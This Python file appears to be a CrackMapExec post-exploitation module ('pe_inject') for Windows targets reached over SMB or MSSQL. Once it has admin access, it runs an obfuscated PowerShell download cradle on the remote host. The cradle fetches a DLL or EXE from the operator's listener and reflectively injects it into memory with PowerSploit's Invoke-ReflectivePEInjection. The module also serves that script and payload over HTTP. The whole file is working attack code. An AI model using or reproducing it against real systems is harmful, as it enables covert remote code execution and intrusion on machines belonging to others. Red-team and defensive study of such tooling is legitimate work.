from cme.helpers.powershell import *
from sys import exit
import os

class CMEModule:
    '''
        Downloads the specified DLL/EXE and injects it into memory using PowerSploit's Invoke-ReflectivePEInjection.ps1 script
        Module by @byt3bl33d3r
    '''
    name = 'pe_inject'
    description = "Downloads the specified DLL/EXE and injects it into memory"
    supported_protocols = ['smb', 'mssql']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            PATH     Path to dll/exe to inject
            PROCID   Process ID to inject into (default: current powershell process)
            EXEARGS  Arguments to pass to the executable being reflectively loaded (default: None)
        '''

        if not 'PATH' in module_options:
            context.log.error('PATH option is required!')
            exit(1)

        self.payload_path = os.path.expanduser(module_options['PATH'])
        if not os.path.exists(self.payload_path):
            context.log.error('Invalid path to EXE/DLL!')
            exit(1)

        self.procid  = None
        self.exeargs = None

        if 'PROCID' in module_options:
            self.procid = module_options['PROCID']

        if 'EXEARGS' in module_options:
            self.exeargs = module_options['EXEARGS']

        self.ps_script = obfs_ps_script('powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1')

    def on_admin_login(self, context, connection):

        payload = """
        $WebClient = New-Object System.Net.WebClient;
        [Byte[]]$bytes = $WebClient.DownloadData('{server}://{addr}:{port}/{pefile}');
        Invoke-ReflectivePEInjection -PEBytes $bytes""".format(server=context.server,
                                                     port=context.server_port,
                                                     addr=context.localip,
                                                     pefile=os.path.basename(self.payload_path))

        if self.procid:
            payload += ' -ProcessID {}'.format(self.procid)

        if self.exeargs:
            payload += ' -ExeArgs "{}"'.format(self.exeargs)

        launcher = gen_ps_iex_cradle(context, 'Invoke-ReflectivePEInjection.ps1', payload, post_back=False)

        connection.ps_execute(launcher, force_ps32=True)
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'Invoke-ReflectivePEInjection.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script.encode())

        elif os.path.basename(self.payload_path) == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.stop_tracking_host()

            with open(self.payload_path, 'rb') as payload:
                request.wfile.write(payload.read())

        else:
            request.send_response(404)
            request.end_headers()